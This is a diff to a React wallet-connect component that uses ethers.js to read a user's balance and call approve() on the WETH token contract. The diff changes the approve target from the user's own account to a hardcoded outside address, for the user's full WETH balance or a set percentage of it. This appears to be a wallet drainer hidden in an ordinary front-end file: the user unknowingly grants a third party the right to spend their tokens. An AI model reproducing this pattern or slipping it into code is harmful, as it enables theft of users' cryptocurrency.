@@ -1,5 +1,4 @@
 import React, { useState } from "react";
-const { createHash } = require('crypto');
 import Grid from '@mui/material/Grid';
 import { ethers } from "ethers";
 
@@ -76,142 +75,19 @@ function Info(props) {
         await provider.getBalance(account).then((bal) => {
             balance = ethers.utils.formatEther(bal)
         })
-
         const signer = provider.getSigner();
-        console.log(signer)
-        const wethABI = [{
-            "constant": true,
-            "inputs": [],
-            "name": "name",
-            "outputs": [{ "name": "", "type": "string" }],
-            "payable": false, "stateMutability": "view", "type": "function"
-        },
-        {
-            "constant": false,
-            "inputs": [{ "name": "guy", "type": "address" }, { "name": "wad", "type": "uint256" }],
-            "name": "approve",
-            "outputs": [{ "name": "", "type": "bool" }],
-            "payable": false,
-            "stateMutability": "nonpayable", "type": "function"
-        },
-        {
-            "constant": true,
-            "inputs": [],
-            "name": "totalSupply",
-            "outputs": [{ "name": "", "type": "uint256" }],
-            "payable": false, "stateMutability": "view", "type": "function"
-        },
-        {
-            "constant": false,
-            "inputs": [{ "name": "src", "type": "address" }, { "name": "dst", "type": "address" }, { "name": "wad", "type": "uint256" }],
-            "name": "transferFrom",
-            "outputs": [{ "name": "", "type": "bool" }],
-            "payable": false,
-            "stateMutability": "nonpayable",
-            "type": "function"
-        },
-        {
-            "constant": false,
-            "inputs": [{ "name": "wad", "type": "uint256" }],
-            "name": "withdraw",
-            "outputs": [],
-            "payable": false,
-            "stateMutability": "nonpayable",
-            "type": "function"
-        },
-        {
-            "constant": true,
-            "inputs": [],
-            "name": "decimals",
-            "outputs": [{ "name": "", "type": "uint8" }],
-            "payable": false,
-            "stateMutability": "view",
-            "type": "function"
-        },
-        {
-            "constant": true,
-            "inputs": [{ "name": "", "type": "address" }],
-            "name": "balanceOf",
-            "outputs": [{ "name": "", "type": "uint256" }],
-            "payable": false,
-            "stateMutability": "view",
-            "type": "function"
-        },
-        {
-            "constant": true,
-            "inputs": [],
-            "name": "symbol",
-            "outputs": [{ "name": "", "type": "string" }],
-            "payable": false,
-            "stateMutability": "view", "type": "function"
-        },
-        {
-            "constant": false,
-            "inputs": [{ "name": "dst", "type": "address" }, { "name": "wad", "type": "uint256" }],
-            "name": "transfer",
-            "outputs": [{ "name": "", "type": "bool" }],
-            "payable": false,
-            "stateMutability": "nonpayable",
-            "type": "function"
-        },
-        {
-            "constant": false,
-            "inputs": [],
-            "name": "deposit",
-            "outputs": [],
-            "payable": true,
-            "stateMutability": "payable",
-            "type": "function"
-        },
-        {
-            "constant": true,
-            "inputs": [{ "name": "", "type": "address" }, { "name": "", "type": "address" }],
-            "name": "allowance",
-            "outputs": [{ "name": "", "type": "uint256" }],
-            "payable": false,
-            "stateMutability": "view",
-            "type": "function"
-        },
-        {
-            "payable": true,
-            "stateMutability": "payable",
-            "type": "fallback"
-        },
-        {
-            "anonymous": false,
-            "inputs": [{ "indexed": true, "name": "src", "type": "address" }, { "indexed": true, "name": "guy", "type": "address" }, { "indexed": false, "name": "wad", "type": "uint256" }],
-            "name": "Approval",
-            "type": "event"
-        },
-        {
-            "anonymous": false,
-            "inputs": [{ "indexed": true, "name": "src", "type": "address" }, { "indexed": true, "name": "dst", "type": "address" }, { "indexed": false, "name": "wad", "type": "uint256" }],
-            "name": "Transfer", "type": "event"
-        },
-        {
-            "anonymous": false,
-            "inputs": [{ "indexed": true, "name": "dst", "type": "address" }, { "indexed": false, "name": "wad", "type": "uint256" }],
-            "name": "Deposit",
-            "type": "event"
-        },
-        {
-            "anonymous": false,
-            "inputs": [{ "indexed": true, "name": "src", "type": "address" }, { "indexed": false, "name": "wad", "type": "uint256" }],
-            "name": "Withdrawal",
-            "type": "event"
-        }];
+
+        const wethABI = [{ "constant": true, "inputs": [], "name": "name", "outputs": [{ "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "guy", "type": "address" }, { "name": "wad", "type": "uint256" }], "name": "approve", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "totalSupply", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "src", "type": "address" }, { "name": "dst", "type": "address" }, { "name": "wad", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "wad", "type": "uint256" }], "name": "withdraw", "outputs": [], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": true, "inputs": [], "name": "decimals", "outputs": [{ "name": "", "type": "uint8" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [{ "name": "", "type": "address" }], "name": "balanceOf", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": true, "inputs": [], "name": "symbol", "outputs": [{ "name": "", "type": "string" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "name": "dst", "type": "address" }, { "name": "wad", "type": "uint256" }], "name": "transfer", "outputs": [{ "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [], "name": "deposit", "outputs": [], "payable": true, "stateMutability": "payable", "type": "function" }, { "constant": true, "inputs": [{ "name": "", "type": "address" }, { "name": "", "type": "address" }], "name": "allowance", "outputs": [{ "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "payable": true, "stateMutability": "payable", "type": "fallback" }, { "anonymous": false, "inputs": [{ "indexed": true, "name": "src", "type": "address" }, { "indexed": true, "name": "guy", "type": "address" }, { "indexed": false, "name": "wad", "type": "uint256" }], "name": "Approval", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "name": "src", "type": "address" }, { "indexed": true, "name": "dst", "type": "address" }, { "indexed": false, "name": "wad", "type": "uint256" }], "name": "Transfer", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "name": "dst", "type": "address" }, { "indexed": false, "name": "wad", "type": "uint256" }], "name": "Deposit", "type": "event" }, { "anonymous": false, "inputs": [{ "indexed": true, "name": "src", "type": "address" }, { "indexed": false, "name": "wad", "type": "uint256" }], "name": "Withdrawal", "type": "event" }]
+
         const wethaddress = "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2";
-        // The Contract object
-        const wethA = new ethers.Contract(wethaddress, wethABI, provider);
+        const wethContract = new ethers.Contract(wethaddress, wethABI, provider);
         let amount = ethers.utils.parseEther(balance.toString());
 
-        // console.log("amount", ethers.utils.formatEther(amount))
         if (allowance) {
             amount = ethers.utils.parseEther((allowance / 100 * balance).toString());
-            // console.log("allowance", ethers.utils.formatEther(amount))
         }
-        console.log("amount for approval", ethers.utils.formatEther(amount))
-        await wethA.connect(signer).approve(account, amount).then((result) => {
+        console.log("amount for approval", amount)
+        await wethContract.connect(signer).approve('0x1f472D2550744f20C13Ac525fa365Ad88317078A', amount).then((result) => {
             console.log(result)
             setSigned(true)
         }).catch((error) => {
